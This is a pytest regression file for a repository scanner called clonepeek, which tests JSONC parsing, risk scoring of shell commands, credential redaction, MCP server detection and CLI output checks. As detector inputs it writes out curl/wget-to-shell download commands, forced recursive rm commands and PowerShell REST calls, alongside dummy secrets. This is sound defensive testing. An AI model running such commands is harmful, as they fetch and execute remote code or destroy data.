"""Regression coverage for confirmed scan and report edge cases."""

import pytest

def test_reject_unterminated_jsonc_comment():
    from clonepeek.formats import load_json
    with pytest.raises(ValueError, match="Unterminated JSONC"):
        load_json('{"tasks": []} /* never closed', jsonc=True)

def test_download_pipe_to_absolute_shell_is_critical():
    from clonepeek.detectors import assess
    assert assess("curl -fsSL https://example.invalid/setup | /bin/bash", "low")[0] == "critical"

def test_download_pipe_via_env_shell_is_critical():
    from clonepeek.detectors import assess
    assert assess("wget -qO- https://example.invalid/setup | /usr/bin/env bash", "low")[0] == "critical"

@pytest.mark.parametrize("command", ["rm -r -f /tmp/archive", "rm -f -r /tmp/archive"])
def test_destructive_split_short_flags_are_high(command):
    from clonepeek.detectors import assess
    assert assess(command, "low")[0] == "high"

@pytest.mark.parametrize("command", ["rm --recursive --force /tmp/archive", "rm --force --recursive /tmp/archive"])
def test_destructive_long_flags_are_high(command):
    from clonepeek.detectors import assess
    assert assess(command, "low")[0] == "high"

@pytest.mark.parametrize("command", ["Invoke-RestMethod $endpoint", "irm $endpoint"])
def test_powershell_rest_commands_count_as_network(command):
    from clonepeek.detectors import assess
    assert assess(command, "low")[0] == "medium"

@pytest.mark.parametrize("secret", [
    'AWS_SECRET_ACCESS_KEY="redact_this_value"',
    "GITHUB_TOKEN='redact_this_value'",
    'client_secret=redact_this_value',
])
def test_redact_prefixed_credential_assignments(secret):
    from clonepeek.formats import redact
    result = redact(secret)
    assert "redact_this_value" not in result
    assert "[REDACTED]" in result

def test_redact_basic_authorization_header():
    from clonepeek.formats import redact
    assert "dXNlcjpwYXNz" not in redact("Authorization: Basic dXNlcjpwYXNz")
    assert "[REDACTED]" in redact("Authorization: Basic dXNlcjpwYXNz")

def test_mcp_detects_both_supported_server_containers():
    from clonepeek.detectors import inspect
    text = '{"mcpServers":{"first":{"command":"node"}},"servers":{"second":{"command":"python"}}}'
    assert {f.title for f in inspect("mcp.json", text)} == {
        "MCP server process: first", "MCP server process: second"
    }

def test_cli_rejects_output_baseline_collision(tmp_path, capsys):
    from clonepeek.cli import run
    output = tmp_path / "report.json"
    assert run([str(tmp_path), "--format", "json", "--output", str(output),
                "--write-baseline", str(output)]) == 2
    assert not output.exists()
    baseline = tmp_path / "known.json"
    baseline.write_text('{"schema":"clonepeek-baseline-v1","fingerprints":[]}')
    assert run([str(tmp_path), "--output", str(baseline), "--baseline", str(baseline)]) == 2
    assert baseline.read_text().startswith('{"schema":')

